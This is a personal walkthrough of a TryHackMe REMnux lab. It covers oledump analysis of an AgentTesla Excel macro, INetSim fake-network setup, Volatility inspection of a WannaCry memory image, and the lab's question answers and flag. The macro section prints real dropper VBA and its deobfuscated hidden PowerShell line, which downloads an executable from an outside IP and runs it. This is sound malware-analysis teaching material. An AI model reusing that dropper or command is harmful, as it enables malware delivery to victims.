| [Home](../README.md) | [Cyber Security 101](../README.md#cyber-security-101) | **REMnux: Getting Started** |

# REMnux: Getting Started

## Contents
- [Introduction](#introduction)
- [Machine Access](#machine-access)
- [File Analysis](#file-analysis)
- [Fake Network to Aid Analysis](#fake-network-to-aid-analysis)
- [Memory Investigation: Evidence Preprocessing](#memory-investigation-evidence-preprocessing)

## 📘Introduction

Remnux is a specialist Linux disto, built specifically for analysing malware. It includes tools, not limited to:
- Volatility
- YARA
- Wireshark
- oledump
- INetSim



## 📘Machine Access

Not much to say here, start the machine and have at it.

Files can be found under `~/Desktop/tasks`



## 📘File Analysis

In this task, we're looking at **static analysis**. 

Fire up the **Terminal Emulator** on the Desktop

Navigate to `~/Desktop/tasks/agenttesla/`.

```Shell
ubuntu@ip-10-10-153-147:~$ cd ~/Desktop/tasks/agenttesla/
ubuntu@ip-10-10-153-147:~/Desktop/tasks/agenttesla$
```

We want to run `oledump.py` against `agenttesla.xlsm`

```Shell
ubuntu@ip-10-10-153-147:~/Desktop/tasks/agenttesla$ oledump.py agenttesla.xlsm 
A: xl/vbaProject.bin
 A1:       468 'PROJECT'
 A2:        62 'PROJECTwm'
 A3: m     169 'VBA/Sheet1'
 A4: M     688 'VBA/ThisWorkbook'
 A5:         7 'VBA/_VBA_PROJECT'
 A6:       209 'VBA/dir'
```

Thankfully it doesn't take long to run.

It looks like we have 4 _VBA scripts_ within the sheet.
- `Sheet1`
- `ThisWorkbook`
- `_VBA_PROJECT`
- `dir`

The **`A`** followed the number represents the data stream, so here we have 6 data streams.

A data stream with a **`M`** represents a macro, a peice of code that can be executed within the host application, in this case Excel.

Our **`M`** of interest is on data stream 4. So lets target this for more info.

This time suffix the previous command with `-s 4` (**select** stream 4.


```Shell
ubuntu@ip-10-10-153-147:~/Desktop/tasks/agenttesla$ oledump.py agenttesla.xlsm -s 4
00000000: 01 AC B2 00 41 74 74 72  69 62 75 74 00 65 20 56  ....Attribut.e V
00000010: 42 5F 4E 61 6D 00 65 20  3D 20 22 54 68 69 00 73  B_Nam.e = "Thi.s
00000020: 57 6F 72 6B 62 6F 6F 10  6B 22 0D 0A 0A 8C 42 61  Workboo.k"....Ba
00000030: 73 01 02 8C 30 7B 30 30  30 32 30 50 38 31 39 2D  s...0{00020P819-
00000040: 00 10 30 03 08 43 23 05  12 03 00 34 36 7D 0D 7C  ..0..C#....46}.|
00000050: 47 6C 10 6F 62 61 6C 01  D0 53 70 61 82 63 01 92  Gl.obal..Spa.c..
00000060: 46 61 6C 73 65 0C 25 00  43 72 65 61 74 61 62 6C  False.%.Creatabl
00000070: 01 15 1F 50 72 65 64 65  63 6C 12 61 00 06 49 64  ...Predecl.a..Id
00000080: 00 23 54 72 75 81 0D 22  45 78 70 6F 73 65 01 1C  .#Tru.."Expose..
00000090: 01 11 40 54 65 6D 70 6C  61 74 40 65 44 65 72 69  ..@Templat@eDeri
000000A0: 76 96 12 43 80 75 73 74  6F 6D 69 7A 84 44 0D 83  v..C.ustomiz.D..
000000B0: 32 50 80 18 80 1C 20 53  75 62 02 20 05 92 5F 4F  2P.... Sub. .._O
000000C0: 70 65 6E 28 00 29 0D 0A  44 69 6D 20 53 00 71 74  pen(.)..Dim S.qt
000000D0: 6E 65 77 20 41 73 04 20  53 80 25 6E 67 2C 20 73  new As. S.%ng, s
000000E0: C0 4F 75 74 70 75 74 07  09 03 14 00 4D 67 67 63  .Output.....Mggc
000000F0: 62 6E 75 61 02 64 01 0C  4F 62 6A 65 63 74 42 2C  bnua.d..ObjectB,
00000100: 07 0A 45 78 65 63 07 0C  0D 06 0A 04 2B 00 BD 5E  ..Exec......+..^
00000110: 70 2A 6F 5E 00 2A 77 2A  65 2A 72 2A 73 10 5E 5E  p*o^.*w*e*r*s.^^
00000120: 2A 68 80 04 6C 5E 2A 00  6C 2A 20 2A 5E 2D 2A 57  *h..l^*.l* *^-*W
00000130: 00 2A 69 2A 6E 2A 5E 64  2A 00 6F 2A 77 5E 2A 53  .*i*n*^d*.o*w^*S
00000140: 2A 74 A0 2A 79 2A 5E 6C  00 11 20 00 14 02 69 01  *t.*y*^l.. ...i.
00000150: 0C 64 2A 5E 65 2A 6E 2A  5E 00 08 2D 00 0B 78 41  .d*^e*n*^..-..xA
00000160: 03 63 2A 12 75 00 0A 5E  69 00 0D 6E 2A 70 40 6F  .c*.u..^i..n*p@o
00000170: 6C 5E 69 63 79 C0 07 62  00 2A 79 70 5E 5E 61 73  l^icy..b.*yp^^as
00000180: 73 20 2A 3B 2A 20 24 01  4D 46 69 0A 6C 41 12 3D  s *;* $.MFi.lA.=
00000190: C0 00 5B 2A 49 2A 80 4F  2A 2E 2A 50 2A 61 C0 0E  ..[*I*.O*.*P*a..
000001A0: 00 68 2A 5D 2A 3A 3A 47  65 1A 74 40 09 2A 83 09  .h*]*::Ge.t@.*..
000001B0: 41 79 28 29 20 40 7C 20  52 65 6E 5E C0 02 2D 00  Ay() @| Ren^..-.
000001C0: 49 74 5E 65 6D 20 2D 4E  04 65 77 42 9A 7B 20 24  It^em -N.ewB.{ $
000001D0: 5F 20 18 2D 72 65 40 62  40 82 27 74 6D 00 70 24  _ .-re@b@.'tm.p$
000001E0: 27 2C 20 27 65 78 80 65  27 20 7D 20 96 50 C1 1D  ', 'ex.e' } .P..
000001F0: 00 54 68 72 75 3B 20 49  6E 00 5E 76 6F 2A 6B 65  .Thru; In.^vo*ke
00000200: 2D 57 00 65 5E 62 52 65  2A 71 75 00 65 73 74 20  -W.e^bRe*qu.est 
00000210: 2D 55 5E 72 00 69 20 22  22 68 74 74 70 00 3A 2F  -U^r.i ""http.:/
00000220: 2F 31 39 33 2E 32 02 30  C3 00 36 37 2F 72 74 2F  /193.2.0..67/rt/
00000230: 00 44 6F 63 2D 33 37 33  37 80 31 32 32 70 64 66  .Doc-3737.122pdf
00000240: 2E 00 16 D0 22 22 20 2D  00 63 2A C1 27 07 34 02  ...."" -.c*.'.4.
00000250: 3B 80 65 2A 61 72 74 2D  50 80 72 6F 63 65 2A 73  ;.e*art-P.roce*s
00000260: 73 88 06 2B 00 B0 46 5E  52 83 2A 28 03 04 2C 20  s..+..F^R.*(.., 
00000270: 68 22 2A 22 00 01 22 C0  7D 97 08 5E 49 86 08 65  h"*"..".}..^I..e
00000280: 74 48 7C 3D 20 C2 B8 65  01 43 77 28 22 57 53 63  tH|= ..e.Cw("WSc
00000290: 72 69 00 70 74 2E 53 68  65 6C 6C EB 8E 0B C2 82  ri.pt.Shell.....
000002A0: 3D C7 03 2E 01 04 C4 18  C0 0A 08 45 6E 64 81 A3  =..........End..
```

**_Not sure if the above formatted correctly_**

We can (_hopfully_) see that the result is in hex. 

Reading through the readable text we can see some key Excel macro key words such as `Sub`, `Dim` etc.

It looks though it is invoking a web request through an ip. Potentially a malicious PDF file.

We can again suffix the command, this time with `--vbadecompress` So lets issue this command and see what we end up with.

```Shell
ubuntu@ip-10-10-153-147:~/Desktop/tasks/agenttesla$ oledump.py agenttesla.xlsm -s 4 --vbadecompress
Attribute VB_Name = "ThisWorkbook"
Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Private Sub Workbook_Open()
Dim Sqtnew As String, sOutput As String
Dim Mggcbnuad As Object, MggcbnuadExec As Object
Sqtnew = "^p*o^*w*e*r*s^^*h*e*l^*l* *^-*W*i*n*^d*o*w^*S*t*y*^l*e* *h*i*^d*d*^e*n^* *-*e*x*^e*c*u*t*^i*o*n*pol^icy* *b*yp^^ass*;* $TempFile* *=* *[*I*O*.*P*a*t*h*]*::GetTem*pFile*Name() | Ren^ame-It^em -NewName { $_ -replace 'tmp$', 'exe' } �Pass*Thru; In^vo*ke-We^bRe*quest -U^ri ""http://193.203.203.67/rt/Doc-3737122pdf.exe"" -Out*File $TempFile; St*art-Proce*ss $TempFile;"
Sqtnew = Replace(Sqtnew, "*", "")
Sqtnew = Replace(Sqtnew, "^", "")
Set Mggcbnuad = CreateObject("WScript.Shell")
Set MggcbnuadExec = Mggcbnuad.Exec(Sqtnew)
End Sub
```

This is much more telling, we a string that is obsfucated with `*` and `^` and then a nice replace to remove them both. The command will then be sent to WScript.

So we can use CyberChef to 'decode' it

Navigate to [CyberChef](https://cyberchef.io/)

Copy the inital value of `Sqtnew` and paste it into the CyberChef Input.

Under the **Operations** perform a search for `replace`. Drag **``Find / Replace** in to the **Recipe** twice.

In the first one, type `^` and change **`REGEX`** with **SIMPLE STRING`**.

Do the same on the second, only type `*` instead.

This will leave you with the following string in the **Output**

```Text
powershell -WindowStyle hidden -executionpolicy bypass; $TempFile = [IO.Path]::GetTempFileName() | Rename-Item -NewName { $_ -replace 'tmp$', 'exe' } �PassThru; Invoke-WebRequest -Uri ""http://193.203.203.67/rt/Doc-3737122pdf.exe"" -OutFile $TempFile; Start-Process $TempFile;
```


### ❓ Question 1

> What Python tool analyzes OLE2 files, commonly called Structured Storage or Compound File Binary Format?

#### 🧪 Process

We're using the tool `oledump.py`

Trying this as the answer

#### ✅ Answer

- `oledump.py` ✅


### ❓ Question 2

> What tool parameter we used in this task allows you to select a particular data stream of the file we are using it with?

#### 🧪 Process

We used `-s` for select followed by the number of the stream.

Trying this as the answer

#### ✅ Answer

- `-s` ✅


### ❓ Question 3

> During our analysis, we were able to decode a PowerShell script. What command is commonly used for downloading files from the internet?

#### 🧪 Process

I usually use `Invoke-WebRequest` along with the url or `-uri` of the file I want to download.

Trying this as the answer

#### ✅ Answer

- `Invoke-WebRequest` ✅


### ❓ Question 4

> What file was being downloaded using the PowerShell script?

#### 🧪 Process

After de-obsfucating we found the file was called `Doc-3737122pdf.exe`

Trying this as the answer

#### ✅ Answer

- `Doc-3737122pdf.exe` ✅


### ❓ Question 5

> During our analysis of the PowerShell script, we noted that a file would be downloaded. Where will the file being downloaded be stored?

#### 🧪 Process

I'm not sure, the variable was `$TempFile`, but this linked to `[IO.Path]::GetTempFileName()` but since I've never used this object in PowerShell I'm not sure what `GetTempFileName()` returns.

I'll go with `$TempFile` and see where that gets me.

Trying this as the answer

#### ✅ Answer

- `$TempFile` ✅


### ❓ Question 6

> Using the tool, scan another file named possible_malicious.docx located in the /home/ubuntu/Desktop/tasks/agenttesla/ directory. How many data streams were presented for this file?

#### 🧪 Process

See question 7, messed process ;). The answer is `16`

Trying this as the answer

#### ✅ Answer

- `16` ✅


### ❓ Question 7

> Using the tool, scan another file named possible_malicious.docx located in the /home/ubuntu/Desktop/tasks/agenttesla/ directory. At what data stream number does the tool indicate a macro present?

#### 🧪 Process

Returning to the VM. 

Type `oledump.py` and double tap _`tab`_ to show all options. 

Since we're after `possible_malicious.docx` we can suffix that. This results in the following

```Shell
ubuntu@ip-10-10-153-147:~/Desktop/tasks/agenttesla$ oledump.py possible_malicious.docx 
  1:       114 '\x01CompObj'
  2:       280 '\x05DocumentSummaryInformation'
  3:       416 '\x05SummaryInformation'
  4:      7557 '1Table'
  5:    343998 'Data'
  6:       376 'Macros/PROJECT'
  7:        41 'Macros/PROJECTwm'
  8: M 1989192 'Macros/VBA/ThisDocument'
  9:      4099 'Macros/VBA/_VBA_PROJECT'
 10:       515 'Macros/VBA/dir'
 11:       112 'ObjectPool/_1649178531/\x01CompObj'
 12:        16 'ObjectPool/_1649178531/\x03OCXNAME'
 13:         6 'ObjectPool/_1649178531/\x03ObjInfo'
 14:        86 'ObjectPool/_1649178531/f'
 15:         0 'ObjectPool/_1649178531/o'
 16:      4096 'WordDocument'
```

Since we're after which data stream may ontain the malicious code, I think we can safely say that is stream **`8`**.

Trying this as the answer

#### ✅ Answer

- `8` ✅



## 📘Fake Network to Aid Analysis

So we have downloaded some malware we want to analyse, we could just do this in our Windows box and hope we have some safeguards in place. Or we can use REMnux to help us out. The REMux VM has a tool called **INetSim: Internet Services Simulation Suite!**



### INetSim

First we need to update the `inetsim.conf` file with the current IP of the **`REMnux_gettingstarted_v7`** VM

Fire up the **Terminal Emulator** 

Take note of the IP address.

```Shell
ubuntu@ip-10-10-161-121:~$ 
```

So we know our IP is `10.10.161.121`. Lets fire up the config file.

```Shell
ubuntu@ip-10-10-161-121:~$ sudo vim /etc/inetsim/inetsim.conf 
```

Tap `/` followed by `dns_default` and press **Return**

drop down to `#dns_default_ip...`

Remove the `#` and update the IP address with the correct ip. the line should look like.

_**Note**: You'll need to tap `i` to enter insert mode_

```shell
dns_default_ip 10.10.161.121
```

Press **Esc** and type `:x` to save and exit

Next we want to grep the file to make sure it has saved and is the correct IP

```Shell
ubuntu@ip-10-10-161-121:~$ cat /etc/inetsim/inetsim.conf | grep dns_default_ip
# dns_default_ip
# Syntax: dns_default_ip <IP address>
dns_default_ip 10.10.161.121	 
```

Now we can start _INetSim_ by issuing `sudo inetsim`

```Shell
ubuntu@ip-10-10-161-121:~$ sudo inetsim
INetSim 1.3.2 (2020-05-19) by Matthias Eckert & Thomas Hungenberg
Using log directory:      /var/log/inetsim/
Using data directory:     /var/lib/inetsim/
Using report directory:   /var/log/inetsim/report/
Using configuration file: /etc/inetsim/inetsim.conf
Parsing configuration file.
Warning: Unknown option '/var/log/inetsim/report/report.104162.txt#start_service' in configuration file '/etc/inetsim/inetsim.conf' line 43
Configuration file parsed successfully.
=== INetSim main process started (PID 2259) ===
Session ID:     2259
Listening on:   0.0.0.0
Real Date/Time: 2025-07-06 20:16:26
Fake Date/Time: 2025-07-06 20:16:26 (Delta: 0 seconds)
 Forking services...
Couldn't create UDP socket: Address already in use at /usr/share/perl5/INetSim/DNS.pm line 36.
  * dns_53_tcp_udp - started (PID 2264)
  * smtp_25_tcp - started (PID 2267)
  * smtps_465_tcp - started (PID 2268)
  * ftp_21_tcp - started (PID 2271)
  * pop3_110_tcp - started (PID 2269)
  * pop3s_995_tcp - started (PID 2270)
  * ftps_990_tcp - started (PID 2272)
  * https_443_tcp - started (PID 2266)
  * http_80_tcp - failed!
 done.
Simulation running.
```

We can ignore the **`failed!`** under **`http_80_tcp`**.

Let's head over to the other VM.

Fire up **FireFox**

Navigate to the IP of the _REMux VM_ (https://10.10.161.121)

We'll need to click **Advanced...** followed by **Accept the Risk and Continue**.

We're met with a note about the default HTML page etc.

We're told to try and download `second_payload.zip`.

```Shell
root@ip-10-10-182-45:~# sudo wget https://10.10.161.121/second_payload.zip --no-check-certificate
--2025-07-06 21:36:47--  https://10.10.161.121/second_payload.zip
Connecting to 10.10.161.121:443... connected.
WARNING: cannot verify 10.10.161.121's certificate, issued by \u2018CN=inetsim.org,OU=Internet Simulation services,O=INetSim\u2019:
  Self-signed certificate encountered.
    WARNING: certificate common name \u2018inetsim.org\u2019 doesn't match requested host name \u201810.10.161.121\u2019.
HTTP request sent, awaiting response... 200 OK
Length: 258 [text/html]
Saving to: \u2018second_payload.zip\u2019

second_payload.zip         100%[======================================>]     258  --.-KB/s    in 0s      

2025-07-06 21:36:47 (10.7 MB/s) - \u2018second_payload.zip\u2019 saved [258/258]
```

Let's try another file, `second_payload.ps1`

```Shell
root@ip-10-10-182-45:~# sudo wget https://10.10.161.121/second_payload.ps1 --no-check-certificate
--2025-07-06 21:42:06--  https://10.10.161.121/second_payload.ps1
Connecting to 10.10.161.121:443... connected.
WARNING: cannot verify 10.10.161.121's certificate, issued by \u2018CN=inetsim.org,OU=Internet Simulation services,O=INetSim\u2019:
  Self-signed certificate encountered.
    WARNING: certificate common name \u2018inetsim.org\u2019 doesn't match requested host name \u201810.10.161.121\u2019.
HTTP request sent, awaiting response... 200 OK
Length: 258 [text/html]
Saving to: \u2018second_payload.ps1\u2019

second_payload.ps1         100%[======================================>]     258  --.-KB/s    in 0s      

2025-07-06 21:42:06 (2.35 MB/s) - \u2018second_payload.ps1\u2019 saved [258/258]
```

Interesting if we cat the file, what do we see here...

```Shell
root@ip-10-10-182-45:~# cat second_payload.ps1 
<html>
  <head>
    <title>INetSim default HTML page</title>
  </head>
  <body>
    <p></p>
    <p align="center">This is the default HTML page for INetSim HTTP server fake mode.</p>
    <p align="center">This file is an HTML document.</p>
  </body>
</html>
```

I think it is safe to say it will be the same for the `second_payload.zip` file we downlaoded downloaded earlier.

```Shell
root@ip-10-10-182-45:~# cat second_payload.zip 
<html>
  <head>
    <title>INetSim default HTML page</title>
  </head>
  <body>
    <p></p>
    <p align="center">This is the default HTML page for INetSim HTTP server fake mode.</p>
    <p align="center">This file is an HTML document.</p>
  </body>
</html>
```

I'm curious, what if I give the `wget` a different `random.file` name.

```Shell
root@ip-10-10-182-45:~# sudo wget https://10.10.161.121/random.file --no-check-certificate
--2025-07-06 21:46:40--  https://10.10.161.121/random.file
Connecting to 10.10.161.121:443... connected.
WARNING: cannot verify 10.10.161.121's certificate, issued by \u2018CN=inetsim.org,OU=Internet Simulation services,O=INetSim\u2019:
  Self-signed certificate encountered.
    WARNING: certificate common name \u2018inetsim.org\u2019 doesn't match requested host name \u201810.10.161.121\u2019.
HTTP request sent, awaiting response... 200 OK
Length: 258 [text/html]
Saving to: \u2018random.file\u2019

random.file                100%[======================================>]     258  --.-KB/s    in 0s      

2025-07-06 21:46:40 (11.0 MB/s) - \u2018random.file\u2019 saved [258/258]
```

When we `cat` it, we alread know the result

```Shell
root@ip-10-10-182-45:~# cat random.file 
<html>
  <head>
    <title>INetSim default HTML page</title>
  </head>
  <body>
    <p></p>
    <p align="center">This is the default HTML page for INetSim HTTP server fake mode.</p>
    <p align="center">This file is an HTML document.</p>
  </body>
</html>
```

So we know what is happening now, what ever we `wget` we are served the home page in what ever format is provided.

Let's drop back to the **REMnux[...]** VM.

Fire up a new **Terminal Emulator**

We want to `cat` the _inetsim_ log. 

Well it looks like the logs are not being updated correctly. So here is a sample from THM.

```Shell
ubuntu@10.10.161.121:~$ sudo cat /var/log/inetsim/report/report.2594.txt
=== Report for session '2594' ===

Real start date            : 2024-09-22 21:04:42
Simulated start date       : 2024-09-22 21:04:42
Time difference on startup : none

2024-09-22 21:04:53  First simulated date in log file
2024-09-22 21:04:53  HTTPS connection, method: GET, URL: https://10.10.161.121/, file name: /var/lib/inetsim/http/fakefiles/sample.html
2024-09-22 21:16:07  HTTPS connection, method: GET, URL: https://10.10.161.121/test.exe, file name: /var/lib/inetsim/http/fakefiles/sample_gui.exe
2024-09-22 21:18:37  HTTPS connection, method: GET, URL: https://10.10.161.121/second_payload.ps1, file name: /var/lib/inetsim/http/fakefiles/sample.html
2024-09-22 21:18:49  HTTPS connection, method: GET, URL: https://10.10.161.121/second_payload.zip, file name: /var/lib/inetsim/http/fakefiles/sample.html
2024-09-22 21:18:49  Last simulated date in log file
===
```


### ❓ Question 1

> Download and scan the file named **flag.txt** from the terminal using the command `sudo wget https://10.10.161.121/flag.txt --no-check-certificate`. What is the flag?

#### 🧪 Process

Back on the AttackBox

We need to `wget` the flag.

```Shell
root@ip-10-10-182-45:~# sudo wget https://10.10.161.121/flag.txt --no-check-certificate; cat flag.txt
--2025-07-06 22:03:02--  https://10.10.161.121/flag.txt
Connecting to 10.10.161.121:443... connected.
WARNING: cannot verify 10.10.161.121's certificate, issued by \u2018CN=inetsim.org,OU=Internet Simulation services,O=INetSim\u2019:
  Self-signed certificate encountered.
    WARNING: certificate common name \u2018inetsim.org\u2019 doesn't match requested host name \u201810.10.161.121\u2019.
HTTP request sent, awaiting response... 200 OK
Length: 151 [text/plain]
Saving to: \u2018flag.txt\u2019

flag.txt                   100%[======================================>]     151  --.-KB/s    in 0s      

2025-07-06 22:03:02 (7.01 MB/s) - \u2018flag.txt\u2019 saved [151/151]


This is the default text document for INetSim HTTP server fake mode.

This file is plain text.

You found it! The flag is = Tryhackme{remnux_edition}
```

We've got `Tryhackme{remnux_edition}`

Trying this as the answer


#### ✅ Answer

- `Tryhackme{remnux_edition}` ✅



### ❓ Question 2

> After stopping the inetsim, read the generated report. Based on the report, what URL Method was used to get the file flag.txt?

#### 🧪 Process

Oh, I see, I didn't realise it was generated post exit. 

```Shell
Simulation stopped.
 Report written to '/var/log/inetsim/report/report.2259.txt' (16 lines)
=== INetSim main process stopped (PID 2259) ===
```

Lets cat out '/var/log/inetsim/report/report.2259.txt'

```Shell
ubuntu@ip-10-10-161-121:~$ sudo cat /var/log/inetsim/report/report.2259.txt 
=== Report for session '2259' ===

Real start date            : 2025-07-06 20:16:26
Simulated start date       : 2025-07-06 20:16:26
Time difference on startup : none

2025-07-06 20:22:11  First simulated date in log file
2025-07-06 20:22:11  HTTPS connection, method: GET, URL: https://10.10.161.121/, file name: /var/lib/inetsim/http/fakefiles/sample.html
2025-07-06 20:22:12  HTTPS connection, method: GET, URL: https://10.10.161.121/favicon.ico, file name: /var/lib/inetsim/http/fakefiles/favicon.ico
2025-07-06 20:36:46  HTTPS connection, method: GET, URL: https://10.10.161.121/second_payload.zip, file name: /var/lib/inetsim/http/fakefiles/sample.html
2025-07-06 20:42:06  HTTPS connection, method: GET, URL: https://10.10.161.121/second_payload.ps1, file name: /var/lib/inetsim/http/fakefiles/sample.html
2025-07-06 20:46:39  HTTPS connection, method: GET, URL: https://10.10.161.121/random.file, file name: /var/lib/inetsim/http/fakefiles/sample.html
2025-07-06 21:03:01  HTTPS connection, method: GET, URL: https://10.10.161.121/flag.txt, file name: /var/lib/inetsim/http/fakefiles/sample.txt
2025-07-06 21:03:01  Last simulated date in log file

===
```

The method was `GET`

Trying this as the answer

#### ✅ Answer

- `GET` ✅



## 📘Memory Investigation: Evidence Preprocessing

**_Useful Link_**: [volatility3.plugins package](https://volatility3.readthedocs.io/en/stable/volatility3.plugins.html)

We've covered malware file analysis, fake networks, next we'll go over the topic of memory analysis.

### Preprocessing With Volatility

Let's walk this through again. We're going to use a took called `Volatility 3`, with vairous plugins such as
- `windows.pstree.PsTree`
- `windows.pslist.PsList`
- `windows.cmdline.CmdLine`
- `windows.filescan.FileScan`
- `windows.dlllist.DllList`
- `windows.malfind.Malfind`
- `windows.psscan.PsScan`

Well, these all look like windows plugins :)

Head over to the **`REMnux`** vm

Fire up the **Terminal Emulator** from the Desktop

Issue the command `sudo -s` to enter root

```Shell
ubuntu@ip-10-10-136-65:~$ sudo -s
root@ip-10-10-136-65:/home/ubuntu# 
```

Next we want to change directory to `/home/ubuntu/Desktop/tasks/Wcry_memory_image/`

```Shell
root@ip-10-10-136-65:/home/ubuntu# cd /home/ubuntu/Desktop/tasks/Wcry_memory_image/
root@ip-10-10-136-65:/home/ubuntu/Desktop/tasks/Wcry_memory_image# 
```

Now we want to issue the `vol3 -f wcry.mem` to review the wannacry malware


#### `windows.pstree.PsTree`

```Shell
root@ip-10-10-136-65:/home/ubuntu/Desktop/tasks/Wcry_memory_image# vol3 -f wcry.mem windows.pstree.PsTree
Volatility 3 Framework 2.0.0
Progress:  100.00		PDB scanning finished                        
PID	PPID	ImageFileName	Offset(V)	Threads	Handles	SessionId	Wow64	CreateTime	ExitTime

4	0	System	0x823c8830	51	244	N/A	False	N/A	N/A
* 348	4	smss.exe	0x82169020	3	19	N/A	False	2017-05-12 21:21:55.000000 	N/A
** 620	348	winlogon.exe	0x8216e020	23	536	0	False	2017-05-12 21:22:01.000000 	N/A
*** 664	620	services.exe	0x821937f0	15	265	0	False	2017-05-12 21:22:01.000000 	N/A
**** 1024	664	svchost.exe	0x821af7e8	79	1366	0	False	2017-05-12 21:22:03.000000 	N/A
***** 1768	1024	wuauclt.exe	0x81f747c0	7	132	0	False	2017-05-12 21:22:52.000000 	N/A
***** 1168	1024	wscntfy.exe	0x81fea8a0	1	37	0	False	2017-05-12 21:22:56.000000 	N/A
**** 1152	664	svchost.exe	0x821bea78	10	173	0	False	2017-05-12 21:22:06.000000 	N/A
**** 544	664	alg.exe	0x82010020	6	101	0	False	2017-05-12 21:22:55.000000 	N/A
**** 836	664	svchost.exe	0x8221a2c0	19	211	0	False	2017-05-12 21:22:02.000000 	N/A
**** 260	664	svchost.exe	0x81fb95d8	5	105	0	False	2017-05-12 21:22:18.000000 	N/A
**** 904	664	svchost.exe	0x821b5230	9	227	0	False	2017-05-12 21:22:03.000000 	N/A
**** 1484	664	spoolsv.exe	0x821e2da0	14	124	0	False	2017-05-12 21:22:09.000000 	N/A
**** 1084	664	svchost.exe	0x8203b7a8	6	72	0	False	2017-05-12 21:22:03.000000 	N/A
*** 676	620	lsass.exe	0x82191658	23	353	0	False	2017-05-12 21:22:01.000000 	N/A
** 596	348	csrss.exe	0x82161da0	12	352	0	False	2017-05-12 21:22:00.000000 	N/A
1636	1608	explorer.exe	0x821d9da0	11	331	0	False	2017-05-12 21:22:10.000000 	N/A
* 1956	1636	ctfmon.exe	0x82231da0	1	86	0	False	2017-05-12 21:22:14.000000 	N/A
* 1940	1636	tasksche.exe	0x82218da0	7	51	0	False	2017-05-12 21:22:14.000000 	N/A
** 740	1940	@WanaDecryptor@	0x81fde308	2	70	0	False	2017-05-12 21:22:22.000000 	N/A
```

Looking through this, it looks like we have a list of parent processes, many of these processes look legitimate but one really sticks out, `@WanaDecryptor@`.

```Text
** 740	1940	@WanaDecryptor@	0x81fde308	2	70	0	False	2017-05-12 21:22:22.000000 	N/A
```


#### `windows.pslist.PsList`

Next we'll run `windows.pslist.PsList` 

```Shell
root@ip-10-10-136-65:/home/ubuntu/Desktop/tasks/Wcry_memory_image# vol3 -f wcry.mem windows.pslist.PsList
Volatility 3 Framework 2.0.0
Progress:  100.00		PDB scanning finished                        
PID	PPID	ImageFileName	Offset(V)	Threads	Handles	SessionId	Wow64	CreateTime	ExitTime	File output

4	0	System	0x823c8830	51	244	N/A	False	N/A	N/A	Disabled
348	4	smss.exe	0x82169020	3	19	N/A	False	2017-05-12 21:21:55.000000 	N/A	Disabled
596	348	csrss.exe	0x82161da0	12	352	0	False	2017-05-12 21:22:00.000000 	N/A	Disabled
620	348	winlogon.exe	0x8216e020	23	536	0	False	2017-05-12 21:22:01.000000 	N/A	Disabled
664	620	services.exe	0x821937f0	15	265	0	False	2017-05-12 21:22:01.000000 	N/A	Disabled
676	620	lsass.exe	0x82191658	23	353	0	False	2017-05-12 21:22:01.000000 	N/A	Disabled
836	664	svchost.exe	0x8221a2c0	19	211	0	False	2017-05-12 21:22:02.000000 	N/A	Disabled
904	664	svchost.exe	0x821b5230	9	227	0	False	2017-05-12 21:22:03.000000 	N/A	Disabled
1024	664	svchost.exe	0x821af7e8	79	1366	0	False	2017-05-12 21:22:03.000000 	N/A	Disabled
1084	664	svchost.exe	0x8203b7a8	6	72	0	False	2017-05-12 21:22:03.000000 	N/A	Disabled
1152	664	svchost.exe	0x821bea78	10	173	0	False	2017-05-12 21:22:06.000000 	N/A	Disabled
1484	664	spoolsv.exe	0x821e2da0	14	124	0	False	2017-05-12 21:22:09.000000 	N/A	Disabled
1636	1608	explorer.exe	0x821d9da0	11	331	0	False	2017-05-12 21:22:10.000000 	N/A	Disabled
1940	1636	tasksche.exe	0x82218da0	7	51	0	False	2017-05-12 21:22:14.000000 	N/A	Disabled
1956	1636	ctfmon.exe	0x82231da0	1	86	0	False	2017-05-12 21:22:14.000000 	N/A	Disabled
260	664	svchost.exe	0x81fb95d8	5	105	0	False	2017-05-12 21:22:18.000000 	N/A	Disabled
740	1940	@WanaDecryptor@	0x81fde308	2	70	0	False	2017-05-12 21:22:22.000000 	N/A	Disabled
1768	1024	wuauclt.exe	0x81f747c0	7	132	0	False	2017-05-12 21:22:52.000000 	N/A	Disabled
544	664	alg.exe	0x82010020	6	101	0	False	2017-05-12 21:22:55.000000 	N/A	Disabled
1168	1024	wscntfy.exe	0x81fea8a0	1	37	0	False	2017-05-12 21:22:56.000000 	N/A	Disabled
```

Again, many of these processes are legitimate, however we still have our concerning process (`@WanaDecryptor@`).

```Text
740	1940	@WanaDecryptor@	0x81fde308	2	70	0	False	2017-05-12 21:22:22.000000 	N/A	Disabled
```

#### `windows.cmdline.CmdLine`

Next, let's take a look to see what command lines are running.

```Shell
root@ip-10-10-136-65:/home/ubuntu/Desktop/tasks/Wcry_memory_image# vol3 -f wcry.mem windows.cmdline.CmdLine
Volatility 3 Framework 2.0.0
Progress:  100.00		PDB scanning finished                        
PID	Process	Args

4	System	Required memory at 0x10 is not valid (process exited?)
348	smss.exe	\SystemRoot\System32\smss.exe
596	csrss.exe	C:\WINDOWS\system32\csrss.exe ObjectDirectory=\Windows SharedSection=1024,3072,512 Windows=On SubSystemType=Windows ServerDll=basesrv,1 ServerDll=winsrv:UserServerDllInitialization,3 ServerDll=winsrv:ConServerDllInitialization,2 ProfileControl=Off MaxRequestThreads=16
620	winlogon.exe	winlogon.exe
664	services.exe	C:\WINDOWS\system32\services.exe
676	lsass.exe	C:\WINDOWS\system32\lsass.exe
836	svchost.exe	C:\WINDOWS\system32\svchost -k DcomLaunch
904	svchost.exe	C:\WINDOWS\system32\svchost -k rpcss
1024	svchost.exe	C:\WINDOWS\System32\svchost.exe -k netsvcs
1084	svchost.exe	C:\WINDOWS\system32\svchost.exe -k NetworkService
1152	svchost.exe	C:\WINDOWS\system32\svchost.exe -k LocalService
1484	spoolsv.exe	C:\WINDOWS\system32\spoolsv.exe
1636	explorer.exe	C:\WINDOWS\Explorer.EXE
1940	tasksche.exe	"C:\Intel\ivecuqmanpnirkt615\tasksche.exe" 
1956	ctfmon.exe	"C:\WINDOWS\system32\ctfmon.exe" 
260	svchost.exe	C:\WINDOWS\system32\svchost.exe -k LocalService
740	@WanaDecryptor@	@WanaDecryptor@.exe
1768	wuauclt.exe	"C:\WINDOWS\system32\wuauclt.exe" /RunStoreAsComServer Local\[400]SUSDS81a6658cb72fa845814e75cca9a42bf2
544	alg.exe	C:\WINDOWS\System32\alg.exe
